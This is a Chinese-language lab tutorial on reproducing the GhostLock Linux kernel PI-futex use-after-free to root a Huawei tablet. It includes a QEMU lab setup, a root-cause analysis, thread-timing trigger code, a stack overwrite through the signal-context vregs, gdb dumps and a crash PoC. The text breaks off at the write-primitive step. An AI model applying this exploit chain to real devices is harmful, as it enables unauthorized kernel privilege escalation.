# GhostLock-DBY教程

> 作者：natsuu233
> 版本：1.0

**全文档手打，求star...**

⚠⚠⚠观前提示：

1. 不要乱下载所谓“适配你的机型”的代码，它们很可能利用漏洞 **偷你的信息和钱**。建议将代码发给AI全文检查，并保证设备上没有敏感信息再运行。
2. 临时root也可能**变砖**：除了写boot，我之前遇到过黑匣子（华为内核崩溃日志记录器）被deepseek玩坏，重启无法恢复的问题。这在DBY是唯一的崩溃分析工具，没有它完全是开盲盒。
3. 分发利用代码可能涉及**法律风险**：不要在社区到处张扬，不要对厂商贴脸开大，自己用就好了。

# 0. 基本信息

| 项目 | 内容 |
| --- | --- |
| 漏洞名称 | CVE-2026-43499 代号GhostLock |
| 漏洞类型 | UAF提权到root |
| 影响版本 | 大多数现代Linux内核 |
| 修复版本 | 2026上半年（本机已停更安全补丁，所以未修复） |
| 利用前置条件 | 内核开启PI futex（大多数安卓设备已开） |
| 复现难度 | 高 |

## 0.1 一句话描述漏洞

用 `syscall` 触发 `PI futex` 死锁，触发内核回滚代码，该代码有bug，造成内核栈上UAF，可提权到root

## 0.2 实验目的

获取本机 (Matepad 11 2021，代号DBY) 临时Root

## 0.3 看不懂文档怎么办

我文档写得很简略，是因为注释和代码能看懂大多数逻辑。所以看不懂就把文档和代码给AI，让它给你讲。

# 1. 靶场环境

## 1.1 靶场环境拓扑（由外到内）

```
+-------------------------------------+          +----------------------+           +----------------------+
|    虚拟机监视器运行环境 (windows)    |  ---->   |   宿主机 (ubuntu)    |  ---->    |    靶场（linux裸核）   |
|     运行vmware workstation pro      |          |       运行qemu       |           |      运行exploit      |
+-------------------------------------+          +---------------------+            +----------------------+
```

## 1.2 软件与版本清单

| 角色 | 系统 / 软件 | 版本 | 备注 |
| --- | --- | --- | --- |
| 靶机 | 基于qemu的Linux裸内核 | 4.19 | DBY内核源码编译所得 |
| 虚拟机监视器 | VMware Workstaiton Pro | 25H2u1 |  |
| 宿主机 | Ubuntu | 24.04.4 LTS | 2-6GB内存，2-6个CPU核心 |
| 电脑 | Windows | 11 Pro 26H2 | 至少16G内存 |
| 安卓平板 | matepad 11 2021 (DBY) | 鸿蒙4.2.0.213 | 补丁版本C00E100R1P5 |

靶场版本清单：

| 名称       | 版本号                 | 下载地址                                                     |
| ---------- | ---------------------- | ------------------------------------------------------------ |
| 真机源码   | 鸿蒙4.0.0 内核4.19.157 | [Huawei Open Source Release Center](https://consumer.huawei.com/en/opensource/) |
| 交叉编译器 | clang-10.0.6           | [clang-r377782d](https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+/refs/heads/android11-release/clang-r377782d/) |



## 1.3 靶场搭建

### 1.3.1 获取并配置源码

DBY的源码从华为服务器下载（见上），搜索DBY即可，找鸿蒙4.0.0版本。

注意：

1. 本来想用官方编内核用的10.0.7，但是没找到。
2. 官方只给4.0不给4.2的源码，不过内核版本一致，不影响复现。

参考文件夹布局：

```sh
pad-res/
├── out-qemu/
│   ├── bzImage # 内核
│   ├── vmlinux # 看结构体布局、函数和变量链接期地址
│   └── initramfs.cpio.gz # 打包后的根文件系统
├── initramfs/ # 根文件系统
│   ├── init # 开机后第一个shell程序
|   |—— etc/ 
|   |   └── inittab # 设置exit后自动重开shell
│   ├── bin/ # BusyBox放这里
│   └── mnt/ # 共享目录（guset侧）
share/ # 共享目录（host侧）
run.sh # qemu开机
mkinitramfs.sh # 根文件系统打包
```

创建一份 `.config`

```sh
cd src # 源码目录
make O=out-qemu defconfig
```

打开关键配置：

```sh
scripts/config --file out-qemu/.config --enable CONFIG_BLK_DEV_INITRD
scripts/config --file out-qemu/.config --enable CONFIG_RD_GZIP
scripts/config --file out-qemu/.config --enable CONFIG_DEVTMPFS
scripts/config --file out-qemu/.config --enable CONFIG_DEVTMPFS_MOUNT
scripts/config --file out-qemu/.config --enable CONFIG_SERIAL_8250
scripts/config --file out-qemu/.config --enable CONFIG_SERIAL_8250_CONSOLE

scripts/config --file out-qemu/.config --enable CONFIG_FUTEX
scripts/config --file out-qemu/.config --enable CONFIG_FUTEX_PI

scripts/config --file out-qemu/.config --enable CONFIG_DEBUG_INFO
scripts/config --file out-qemu/.config --enable CONFIG_DEBUG_INFO_DWARF4
scripts/config --file out-qemu/.config --enable CONFIG_GDB_SCRIPTS
scripts/config --file out-qemu/.config --enable CONFIG_KALLSYMS
scripts/config --file out-qemu/.config --enable CONFIG_KALLSYMS_ALL
scripts/config --file out-qemu/.config --enable CONFIG_CHECKPOINT_RESTORE

scripts/config --file out-qemu/.config --enable CONFIG_NET_9P
scripts/config --file out-qemu/.config --enable CONFIG_9P_FS
scripts/config --file out-qemu/.config --enable CONFIG_NET_9P_VIRTIO
scripts/config --file out-qemu/.config --enable CONFIG_VIRTIO_PCI
```

可选：

```sh
# scripts/config --file out-qemu/.config --enable CONFIG_KASAN # 别开，偏移会变奇怪
scripts/config --file out-qemu/.config --enable CONFIG_PROVE_LOCKING
scripts/config --file out-qemu/.config --enable CONFIG_DEBUG_RT_MUTEXES
```

让 Kconfig 补齐依赖、修正冲突：

```sh
make O=out-qemu olddefconfig
```

### 1.3.2 编译内核

这有一份AI生成的编译过程： `参考资料/平板内核QEMU启动实验报告（可复现）.md` ，核心目标是：

```bash
make -j2 bzImage # 最多-j3就够了，十分钟
```

完成后，这两个复制出来：

```bash
cp out-qemu/arch/x86/boot/bzImage out-qemu/
cp out-qemu/arch/x86/boot/vmlinux out-qemu/
```

### 1.3.3 制作 initramfs

initramfs 本质是一个 **gzip 压缩的 cpio newc 归档**。内核启动后把它解压到内存，作为根文件系统，然后执行 `/init`。

放入 BusyBox，用静态 BusyBox 最方便：

```bash
# 注意：可能要考虑相对/绝对路径问题，以下仅供参考
cp /bin/busybox initramfs/bin/
cd initramfs
./bin/busybox --install -s bin
cd ..
```

写 `initramfs/init`：

```sh
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev 2>/dev/null
mkdir -p /dev/pts
mount -t devpts devpts /dev/pts 2>/dev/null
mount -t tmpfs tmpfs /tmp
mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt

echo "=== initramfs boot ok ==="

# 交互 shell
exec /bin/busybox init # 不要用exec setsid cttyhack /bin/sh，关不了机
# 这样的话输入exit没有shell，于是新建文件initramfs/etc/inittab，内容是::respawn:-/bin/sh
```

赋权：

```bash
chmod +x initramfs/init
```

打包 initramfs：

```bash
cd initramfs
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../out-qemu/initramfs.cpio.gz
cd ..
```

### 1.3.4 写 `run.sh`

```bash
qemu-system-x86_64 \
  -m 1G \
  -smp 2 \
  -kernel "out-qemu/bzImage" \
  -initrd "out-qemu/initramfs.cpio.gz" \
  -append "console=ttyS0 rdinit=/init oops=panic panic=-1 nokaslr randomize_kstack_offset=off" \
  -nographic \
  -enable-kvm \
  -cpu host \
  -virtfs local,path="share",mount_tag=host0,security_model=none
```

解释关键参数：

- `-kernel`：启动内核 `bzImage`。
- `-initrd`：传入 initramfs。
- `-append`：内核命令行。`console=ttyS0` 把控制台给串口；`rdinit=/init` 指定第一个用户态程序；`oops=panic` 让 oops 直接 panic；`panic=-1` 不自动重启；`nokaslr` 和 `randomize_kstack_offset=off`方便调试。
- `-nographic`：把串口接到当前终端。
- `-enable-kvm -cpu host`：加速。没 KVM 就去掉。
- `-virtfs`：共享目录。
- -s -S：需要用gdb连接内核时才加。运行脚本后卡住，等待gdb发出continue指令。

运行run.sh，开机后：

```bash
uname -a # 能看到内核版本
```

# 2. 漏洞原理

## 2.1 详情

PI futex是特殊的futex。持有PI futex的线程W想要换成另一PI futex，可以在一个普通futex等待，然后另一线程main唤醒并修改W为目标PI futex。

但是，如果W等待时触发死锁，会被内核回滚：

```c
int rt_mutex_start_proxy_lock(struct rt_mutex_base *lock, struct rt_mutex_waiter *waiter, struct task_struct *task) {
    ...
    ret = __rt_mutex_start_proxy_lock(lock, waiter, task);
    if (unlikely(ret))
        remove_waiter(lock, waiter); // ret == -EDEADLK 时回滚
    ...
}
```

这里涉及到几个结构体：

**task_struct**

每个线程/进程在内核里对应一个 `task_struct`。里面有：

```c
struct task_struct {
    ...
    struct rt_mutex_waiter *pi_blocked_on; // 这个task当前因为 PI 锁阻塞在哪个rt_mutex_waiter上
    raw_spinlock_t pi_lock; //保护本结构体成员的锁
    ...
};
```

如果任务不再阻塞，就应该把 `pi_blocked_on` 清成 `NULL`。

**rt_mutex_waiter**

表示“我的task在等某个 rtmutex”，在task的内核栈上

```c

struct rt_mutex_waiter {
    ···
    struct task_struct *task;     // 指回我的task
    struct rt_mutex_base *lock;   // 在等哪把锁
    ···
};
```

现在看回滚代码：

```c
// kernel/locking/rtmutex.c
static void remove_waiter(struct rt_mutex_base *lock, struct rt_mutex_waiter *waiter) {
    raw_spin_lock(&current->pi_lock); //current是内核宏，表示当前task_struct
    ···
    current->pi_blocked_on = NULL;   // 错在这里
    raw_spin_unlock(&current->pi_lock);
}
```

remove_waiter()原本只用于一种场景：

```text
当前task_struct自己清理自己的pi_blocked_on。
```

但在rt_mutex_start_proxy_lock()中，发起“切换W的锁”这个动作的是main。

所以remove_waiter()中，current 是线程 main。于是：

```c
current->pi_blocked_on = NULL;  // 清了 main 的
```

真正应该清的是：

```c
waiter->task->pi_blocked_on = NULL; // W 的
```

结果：

```text
W->pi_blocked_on 仍然指向 W 内核栈上的 waiter
```

而 W 随后会从 futex 系统调用返回用户态，它的内核栈帧被弹出。

于是：

```text
W->pi_blocked_on 指向已失效的内核栈地址
```

这就是 stack-UAF。

攻击者只需在main线程触发一次sched_setattr()，就能促使内核读这个悬垂指针，我们称这个操作为“消费”。

## 2.2 总结

```
制造死锁
   ↓
内核回滚获取锁的操作
   ↓
内核调用remove_waiter()
   ↓
remove_waiter()没有清掉waiter->task->pi_block_on
   ↓
UAF
```

# 3. 复现步骤

## 3.1 稳定触发回滚

上一节提到，要走到 `remove_waiter()` ，需要内核检测到死锁。

需要三个 futex 和三个线程：

- `f_pi_chain`：PI futex，先由W线程持有。
- `f_pi_target`：PI futex，先由O线程持有。
- `f_wait`：普通 futex，W线程在这里等，准备被线程 main 转到 `f_pi_target`。

时序：

1. W 先锁住 `f_pi_chain`，然后调用 `FUTEX_WAIT_REQUEUE_PI(f_wait -> f_pi_target)`，意思是在f_wait睡眠，等待被转到f_pi_target。
2. O 先锁住 `f_pi_target`，再去锁 `f_pi_chain`，但 `f_pi_chain` 被 W 持有，所以 O 阻塞。
3. main 调用 `FUTEX_CMP_REQUEUE_PI(f_wait -> f_pi_target)`，意思是尝试把 W 转到 `f_pi_target`。

此时依赖链：

```text
W 等 f_pi_target ----------> f_pi_target 的 owner 是 O
       ^                                 |
       |                                 |
       |                                 \/
f_pi_chain 的 owner 是 W	<-----	O 等 f_pi_chain
```

内核检测到死锁，进入回滚，调用 `remove_waiter()`。如之前所述，W 的 `pi_blocked_on` 变成悬空指针。

不过这里有个问题：main怎么知道何时可以调用 `FUTEX_CMP_REQUEUE_PI`？其实为了简便，用一个粗暴的办法：

```CPP
while (!w_owns_chain || !o_owns_target) //等两线程拿到第一把锁
        asm volatile("yield");
mysleep(100);//等两线程拿到第二把锁，形成死锁（未触发）
long r = cmp_requeue_pi(&f_wait, &f_target, 0); // FUTEX_CMP_REQUEUE_PI，触发死锁，回滚
```

虽然不保证其他设备100%成功，但是DBY行得通。严谨和简洁总是相互制约的。

## 3.2 覆写悬垂指针

`官方博客原文-x86.txt`用的是user_auxv作为自定义数据，这套方案适用于`Linux6.12+x86_64`主线内核：

```text
构造一个user_auxv数组，填入自定义数据，通过系统调用覆盖到waiter的位置。
```

**关键问题：如何精准覆盖waiter？**

```text
官方博客原文-x86.txt，提到：
1. waiter是他自己线程的内核栈变量；
2. user_auxv数组也是他自己线程的内核栈变量；
3. 如果同一线程先有悬垂waiter，再有user_auxv，两者大致落在同一位置（关闭randomize_kstack_offset）。
```

因此，我们只需要 **看到悬垂waiter被自定义数据覆盖**，就证明方案可行。

注意：

1. auxv方案并不适合安卓系统（官方博客说适配linux-6.12），本节（3.2.1）只是借此讲解如何观测 **waiter有没有被盖住**，比如基本的gdb、反汇编；
2. 适合DBY的替代方案从3.2.2节开始，之后都是针对DBY的适配，和6.12无关
3. 4.19内核没有randomize_kstack_offset（6.12有），所以本文档不讲。

### 3.2.1 覆盖部分waiter（Linux-6.12）

整体思路是：计算 waiter 和 auxv 在内存中的起始位置，以及 auxv 数组的大小 AT_VECTOR_SIZE，即可判断 waiter 是否落在 (auxv, auxv + AT_VECTOR_SIZE) 区间内。

#### 3.2.1.1 算AT_VECTOR_SIZE

在源码根目录：

```sh
grep -R "define AT_VECTOR_SIZE" include/linux arch/x86
```

综合几个文件计算即可。

#### 3.2.1.2 获取waiter内存地址

waiter是它自己线程的内核栈变量，但是被编译器优化后，可能无法使用p waiter（**本靶场实测可用**，这节仅做补充）。

联想到：waiter可能作为函数参数传到子函数里。在Linux中，函数参数在函数调用前会放到寄存器里，我们读取寄存器就能获得waiter。

我们选这个：

```c
// Line 1532 of "../kernel/locking/rtmutex.c"
1532     * Must be called with lock->wait_lock held and interrupts disabled. It must
1533     * have just failed to try_to_take_rt_mutex().
1534     */
1535    static void __sched remove_waiter(struct rt_mutex_base *lock,
1536                                      struct rt_mutex_waiter *waiter)
1537    {
1538            bool is_top_waiter = (waiter == rt_mutex_top_waiter(lock));
1539            struct task_struct *owner = rt_mutex_owner(lock);
1540            struct rt_mutex_base *next_lock;
1541
```

然后在gdb：

```sh
gdb vmlinux
target remote :1234
hb remove_waiter
c
# 在guest运行dif-tid
set print pretty on
p *waiter # 如果没被优化，就能直接看
p (struct rt_mutex_waiter)*$rsi # 如果显示找不到符号，就用这个，效果等价
```

于是我们能看见waiter的布局：

```json
// 这是6.12的布局，实际布局各家厂商、不同版本有差异，以你的设备为准
$2 = {
  tree = {
    entry = {
      __rb_parent_color = 1, //合理：节点还没挂进树（parent=NULL，color=RT_WHITE=1），或已摘除
      rb_right = 0x0 <fixed_percpu_data>, //合理：未入树
      rb_left = 0x0 <fixed_percpu_data> //合理：未入树
    },
    prio = 120, //合理，正好是默认 nice 0 的 RT 优先级基准（MAX_RT_PRIO=100，普通任务 effective prio 100+20=120）
    deadline = 0
  },
  pi_tree = {
    entry = {
      __rb_parent_color = 18446612682235116672,
      rb_right = 0x0 <fixed_percpu_data>,
      rb_left = 0x0 <fixed_percpu_data>
    },
    prio = 120,
    deadline = 0
  },
  task = 0xffff88800a96c300,
  lock = 0xffff88800a001d10,
  wake_state = 3,
  
ww_ctx = 0x1111111111111111
}
```

#### 3.2.1.3 获取auxv内存地址

waiter可以通过断在函数入口（比如我们选的rt_mutex_wait_proxy_lock）， `p waiter` 或者看寄存器。但是auxv涉及到的函数很少，需要反汇编。

auxv是 `prctl_set_mm_map` 的局部变量，于是：

```sh
cd ~/ghostLock/linux-6.12
objdump -t out-qemu/vmlinux | grep -w prctl_set_mm_map      # 拿函数首地址和函数大小
objdump -d --start-address=0xffffffff811ae510 --stop-address=0xffffffff811ae6c0 out-qemu/vmlinux   # 反汇编
```

输出大致如下（nokaslr ，省略无关部分）：

```asm
ffffffff811ae510 <prctl_set_mm_map>:
ffffffff811ae510:  call __fentry__          <- +0   函数入口(KASAN插桩位置)
ffffffff811ae515:  push %r15                <- +5	push是压栈，压一次8字节
ffffffff811ae51f:  push %r14                <- +0xf
ffffffff811ae521:  push %r13                <- +0x11
ffffffff811ae523:  push %r12                <- +0x13
ffffffff811ae532:  push %rbp                <- +0x22
ffffffff811ae533:  push %rbx                <- +0x23	一共压了6*8 = 48字节，即0x30字节
ffffffff811ae534:  sub  $0x2c8,%rsp         <- +0x24   ★局部变量从这里开始
ffffffff811ae55d:  lea  0xc8(%rsp),%r14     <- +0x4d   ★user_auxv 的地址放进 r14
```

为什么最后一行是user_auxv？我们在gdb看一下：

```sh
gdb -q vmlinux
disassemble /m prctl_set_mm_map # gdb内置反汇编工具，源码行号和汇编一一对应
```

找到关于user_auxv的输出：

```asm
2014            unsigned long user_auxv[AT_VECTOR_SIZE];
   0xffffffff811ae55d <+77>:    lea    0xc8(%rsp),%r14 # 就是这个
   0xffffffff811ae5bc <+172>:   mov    $0x34,%ecx
   0xffffffff811ae5c7 <+183>:   mov    %r14,%rdi
   0xffffffff811ae5ca <+186>:   rep stos %rax,%es:(%rdi)
```

所以auxv内存地址相对于函数入口的偏移量：

```text
push6次，压入0x30字节，sub了0x2c8字节，最后一行加0xc8字节。
偏移量 = 0x30 + 0x2c8 - 0xc8 = 0x230
```

现在来做验证。

启动靶场，在gdb：

```sh
hb prctl_set_mm_map
c
# guest运行auxv-cover，等待断点命中
set $auxv_addr = $rsp - 0x230 # 这就是user_auxv的实际地址！
```

当然，我们可以在gdb读一下数组里的东西，确认这是我们的auxv：

```sh
# 循环执行到user_auxv初始化的行
n
x/16gx $auxv_addr
```

要next多少次才能看到初始化后的内存内容呢？到这里就可以了：

```asm
(gdb) n
212             return _copy_from_user(to, from, n);
(gdb) x/16gx $auxv_addr
0xffff88800acffad0:     0x0000000000000000      0x0000000000000000
0xffff88800acffae0:     0x0000000000000000      0x0000000000000000
0xffff88800acffaf0:     0x0000000000000000      0x0000000000000000
0xffff88800acffb00:     0x0000000000000000      0x0000000000000000
0xffff88800acffb10:     0x0000000000000000      0x0000000000000000
0xffff88800acffb20:     0x0000000000000000      0x0000000000000000
0xffff88800acffb30:     0x0000000000000000      0x0000000000000000
0xffff88800acffb40:     0x0000000000000000      0x0000000000000000
(gdb) n
2050                    user_auxv[AT_VECTOR_SIZE - 2] = AT_NULL;
(gdb) x/16gx $auxv_addr
0xffff88800acffad0:     0xa5a5a5a5deadbeef      0xaaaaaaaaaaaaaaaa
0xffff88800acffae0:     0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0xffff88800acffaf0:     0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0xffff88800acffb00:     0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0xffff88800acffb10:     0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0xffff88800acffb20:     0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0xffff88800acffb30:     0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0xffff88800acffb40:     0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
```

我是进行了13次next。

看到0xa5a5a5a5deadbeef（魔数），说明这确实是了auxv起始地址，不多不少。

#### 3.2.1.4 计算是否盖住waiter

现在计算是否覆盖成功。

在gdb：

```sh
hb remove_waiter
hb prctl_set_mm_map
c
# guest运行poc，等待断点命中
# 首先命中remove_waiter
set $waiter_addr = waiter
c
# 然后命中prctl_set_mm_map
set $auxv_addr = $rsp - 0x230
n 13 # 让数据复制上去

# 保险起见检查一下
x/16gx $auxv_addr 
p *$waiter_addr
x/16gx $waiter_addr

# 小于8 * AT_VECTOR_SIZE则覆写成功
p (long long)$waiter_addr - (long long)$auxv_addr 
```

可能的waiter布局：

```sh
$3 = {
  tree = {
    entry = {
      __rb_parent_color = 12297829382473034410,
      rb_right = 0xaaaaaaaaaaaaaaaa, # 显然是我们填的0xaa
      rb_left = 0xaaaaaaaaaaaaaaaa
    },
    prio = 22441876,
    deadline = 1
  },
  pi_tree = {
    entry = {
      __rb_parent_color = 18446744071632339216,
      rb_right = 0xffffffff812c178d <lock_release+1197>,
      rb_left = 0x41b58ab3
    },
    prio = -2123496349,
    deadline = 1102416563
  },
  task = 0xffffffff84de2b28,
  lock = 0xffffffff812c12e0 <lock_release>,
  wake_state = 2026696704,
  ww_ctx = 0xee5db0c783847c00
}
```

可能的waiter内存数据：

```asm
0xffff88800ab37c58:     0xaaaaaaaaaaaaaaaa      0xaaaaaaaaaaaaaaaa
0xffff88800ab37c68:     0xaaaaaaaaaaaaaaaa      0x1ffff11001566f94
0xffff88800ab37c78:     0x0000000000000001      0xffffffff84304110
0xffff88800ab37c88:     0xffffffff812c178d      0x0000000041b58ab3
0xffff88800ab37c98:     0xffffffff816e0463      0x0000000041b58ab3
0xffff88800ab37ca8:     0xffffffff84de2b28      0xffffffff812c12e0
0xffff88800ab37cb8:     0x00007f6a78ccf000      0xee5db0c783847c00
0xffff88800ab37cc8:     0xee5db0c783847c00      0xffff88800abcec00
```

如果是上面两段代码的布局，那么：

```sh
(gdb) p (long long)$w_addr - (long long)$a_addr
$4 = 392 # 假设AT_VECTOR_SIZE = 52，则52 - 392 / 8 = 3，刚好是3个0xaaaaaaaaaaaaaaaa
```

#### 3.2.1.5 增大waiter覆盖率

上面的prctl调用只覆盖了3个qword，我们需要覆盖整个waiter（或大部分）才能提权。

**关键问题：如何覆盖整个waiter？**

```
1. 落点精准：尽量落在waiter附近
2. 窗口够大：越大越好
```

官方博客推荐**换倾向以上条件的 syscall** ，可惜，我尝试的最佳候选 `setsockopt` 剩16B没有覆盖到。

聪明的 **`deepseek` 注意到**：并非只能换syscall，其实可以利用 `rt_sigreturn` 中的 copy_from_user 完成高达512B的拷贝，3.2.3详细讲解。

### 3.2.2 换成真机自编译内核

以真机 DBY（matepad 11 2021代号）为例，编译内核源码，尝试搭建新靶场。

#### 3.2.2.1 环境

**但注意：不要开KASAN**，真机环境不可能开KASAN，并在上一阶段已经发现KASAN会导致栈布局变化。

我的 `run.sh` （fadv请看3.3.1节）：

```sh
#!/bin/bash
# initcall_blacklist 里额外屏蔽厂商 usb_update 线程（pure_initcall msm_restart_init）：
# QEMU 的 dummy-virt DTB 没有 qcom,msm-imem-restart_reason 节点，该线程否则每 2 秒刷
# "restart_reason is null, wait for ready"。副作用：msm-restart 平台驱动不注册
#（QEMU 无 pshold 节点，本就不会 probe），仅 QEMU 侧，不碰内核源码。

# 检查当前用户是否为 root，非root无法建阻塞文件
if [ "$(id -u)" -ne 0 ]; then
    echo "错误：请使用sudo运行此脚本。" >&2
    exit 1
fi

# 先运行fadv丢缓存，不然阻塞不生效
if [ -z "$(pgrep fadv)" ]; then
    echo "请先运行share/fadv"
    exit 1
fi

qemu-system-aarch64 \
  -M virt,secure=on,virtualization=on \
  -cpu cortex-a57 \
  -smp 3 \
  -m 512M \
  -kernel out-qemu/Image \
  -initrd out-qemu/initramfs.cpio.gz \
  -append "oops=panic loglevel=0 console=ttyAMA0,115200 earlycon rdinit=/init panic=-1 initcall_blacklist=proc_app_info_init,msm_restart_init" \
  -nographic \
  -no-reboot \
  -virtfs local,path="share",mount_tag=host0,security_model=none \
  -virtfs local,path="delay_share",mount_tag=host1,security_model=none
```

#### 3.2.2.2 验证auxv lane不行

先反汇编：

```sh
natsu@ubuntu:~/psrc/scripts/out-pad$ gdb-multiarch -q vmlinux
Reading symbols from vmlinux...
(gdb) disassemble /m prctl_set_mm_map
No symbol "prctl_set_mm_map" in current context.
```

查到 man 页原话：

[PR_SET_MM_MAP(2const) — manpages-dev — Debian unstable — Debian Manpages](https://manpages.debian.org/unstable/manpages-dev/PR_SET_MM_MAP.2const.en.html)

```text
"These features are available only if the kernel is built with the CONFIG_CHECKPOINT_RESTORE option enabled."
```

再用ADB看真机 `config.gz` 发现没开：

```sh
$ adb shell 'zcat /proc/config.gz | grep -iE CHECKPOINT_RESTORE'
# CONFIG_CHECKPOINT_RESTORE is not set
```

所以DBY没这个函数，是因为**没开这个配置**，而官方博客用这个，是因为有的机器开了，比如 `ubuntu24.04` ：

```sh
/boot/config-6.17.0-14-generic:247:CONFIG_CHECKPOINT_RESTORE=y
```

### 3.2.3 覆盖整个waiter

这条路线我们叫 rt_sigreturn lane（也叫 lane 11）。

#### 3.2.3.1 原理

内核态可以被 **信号** 打断，触发信号处理程序。打断时内核态上下文被存放在用户栈，用户态允许 **修改内核态上下文** 。而上下文中有个数组叫vregs，有512B，且落点接近waiter。所以修改vregs就能实现和auxv一样的功能。

优点：保证copy_from_user是最后一次syscall；天然兼容大量内核；不受编译器版本影响。

#### 3.2.3.2 代码核心讲解

首先要注册handler：

```cpp
int main() {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = l11_sig_handler;//这里
    ···
}
```

然后waiter线程就绪后，给自己发信号：

```cpp
void Prim::waiter() {
    Print print("W");
    w_tid = my_tid();
    lock_pi(&f_chain);
    w_owns_chain = true;
    wait_requeue_pi(&f_wait, &f_target);
    while (true) {
        std::unique_lock ul(cv_mtx);
        cv.wait(ul, [&]{return cleanup || place_stack;});
        if (cleanup) break;
        place_stack = false;
        ul.unlock();
        setup_altstack();
        syscall(SYS_tgkill, getpid(), my_tid(), SIGUSR1); //涂完后自动设w_done
        // 消费期间严禁发syscall
    }
    //收尾，防止内核读到悬垂waiter崩溃
    unlock_pi(&f_chain);
    print("放锁收尾成功");
}
```

注意信号发出时，CPU处在内核态，所以**被信号handler打断**。

handler运行前，会把内核栈以及寄存器等上下文保存到用户栈，handler返回再恢复内核栈。

所以我们要把上下文里的**vregs数组改成魔数**，这一步交给信号handler：

```cpp
// 在 ucontext 里找 fpsimd 记录
unsigned long *find_vregs(char *ucp) {
    for (int i = 0; i <= 0x800; i += 4) {
        unsigned int magic = 0;
        memcpy(&magic, ucp + i, 4);
        if (magic != FPSIMD_MAGIC) continue;
        return (unsigned long *)(ucp + i + VREGS_OFF);
    }
    pstr("[handler] 没找到fpsimd魔数\n");
    _exit(1);
}
```

vregs数组所在结构体原型（以内核源码为准，注意厂商可能在未开源代码进一步调整，已知DBY所见即所得）：

```cpp
// arch/arm64/include/uapi/asm/sigcontext.h
// uapi在 asm/sigcontext.h
struct _aarch64_ctx {
    __u32 magic;
    __u32 size;
};

#define FPSIMD_MAGIC    0x46508001

struct fpsimd_context {
    struct _aarch64_ctx head;
    __u32 fpsr;
    __u32 fpcr;
    __uint128_t vregs[32];
};
```



#### 3.2.3.3 在GDB实操

连上GDB后：

```sh
hb remove_waiter
c
# 靶场运行pad-lane-cover
set $w_addr = waiter
hb __arch_copy_from_user if $x2 == 512 # 断在512B的copy_from_user，这么大的拷贝少见，一般不会命中错
c
bt # 怕命中错就看一眼栈帧
```

大概长这样：

```powershell
#0  __arch_copy_from_user () at ../arch/arm64/lib/copy_from_user.S:67
#1  0xffffff800808df40 in __copy_from_user (to=<optimized out>, from=0x7fb44dbbd0, n=512)
    at /home/natsu/ghostLock/pad/Code_Opensource/kernel/out-pad/../include/linux/uaccess.h:75
#2  restore_fpsimd_context (ctx=<optimized out>) at ../arch/arm64/kernel/signal.c:214
#3  restore_sigframe (sf=<optimized out>, regs=<optimized out>) at ../arch/arm64/kernel/signal.c:535
#4  __arm64_sys_rt_sigreturn (__unused=<optimized out>) at ../arch/arm64/kernel/signal.c:562
#5  0xffffff8008099570 in __invoke_syscall (regs=0xffffff800caa3ec0, syscall_fn=0x7fffffffff) at ../arch/arm64/kernel/syscall.c:36
#6  invoke_syscall (regs=0xffffff800caa3ec0, scno=139, sc_nr=435, syscall_table=0xffffff8009e008c0 <sys_call_table>)
    at ../arch/arm64/kernel/syscall.c:48
#7  el0_svc_common (regs=0xffffff800caa3ec0, scno=139, sc_nr=435, syscall_table=0xffffff8009e008c0 <sys_call_table>)
    at ../arch/arm64/kernel/syscall.c:117
#8  0xffffff80080994c0 in el0_svc_handler (regs=0x7fffffffff) at ../arch/arm64/kernel/syscall.c:163
#9  0xffffff8008084488 in el0_svc () at ../arch/arm64/kernel/entry.S:950
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
```

restore_fpsimd_context 和 restore_sigframe 还有 __arm64_sys_rt_sigreturn 显然是信号相关函数。

然后：

```sh
finish
x/16gx $w_addr
```

于是看到了成功覆盖的画面：

```asm
0xffffff800caa3cc0:     0xbab1d0110000001a      0xbab1d0110000001b
0xffffff800caa3cd0:     0xbab1d0110000001c      0xbab1d0110000001d
0xffffff800caa3ce0:     0xbab1d0110000001e      0xbab1d0110000001f
0xffffff800caa3cf0:     0xbab1d01100000020      0xbab1d01100000021
0xffffff800caa3d00:     0xbab1d01100000022      0xbab1d01100000023
0xffffff800caa3d10:     0xbab1d01100000024      0xbab1d01100000025
0xffffff800caa3d20:     0xbab1d01100000026      0xbab1d01100000027
0xffffff800caa3d30:     0xbab1d01100000028      0xbab1d01100000029
```

严谨一点：我们看一下waiter的末尾：

```sh
x/16gx $w_addr+1 # 加1表示跳过整个waiter
```

于是：

```asm
0xffffff800caa3d18:     0xbab1d01100000025      0xbab1d01100000026
0xffffff800caa3d28:     0xbab1d01100000027      0xbab1d01100000028
0xffffff800caa3d38:     0xbab1d01100000029      0xbab1d0110000002a
0xffffff800caa3d48:     0xbab1d0110000002b      0xbab1d0110000002c
0xffffff800caa3d58:     0xbab1d0110000002d      0xbab1d0110000002e
0xffffff800caa3d68:     0xbab1d0110000002f      0xbab1d01100000030
0xffffff800caa3d78:     0xbab1d01100000031      0xbab1d01100000032
0xffffff800caa3d88:     0xbab1d01100000033      0xbab1d01100000034
```

到此为止成功覆盖整个waiter！

### 3.2.4 PoC：触发oops

只需要在覆盖整个waiter后：

```cpp
void Prim::consumer() {
    //此后到消费完别做其他事
    if (delay_us > 0) {
        auto until = rdcnt() + delay_us * (frq / 1000'000UL);
        while (rdcnt() < until) {
            asm volatile("yield");
        }
    }
    long sr = sched_setattr_batch(w_tid);//消费
    w_done = false; // 每次消费重新涂栈
    Print print("consumer");
    if (sr < 0) {
        print("消费失败",strerror(errno));
        exit(1);
    }
}
```

用`sched_setattr_batch(w_tid);` 触发走PI链，内核就会读到垃圾值，设备数秒后重启，验证了UAF的存在。

### 3.2.5 受限写原语（0号布局）

#### 3.2.5.1 原理

要解释受限写，我们先看源码：

```cpp
struct rb_node {
        long unsigned int          __rb_parent_color;    /*     0     8 */
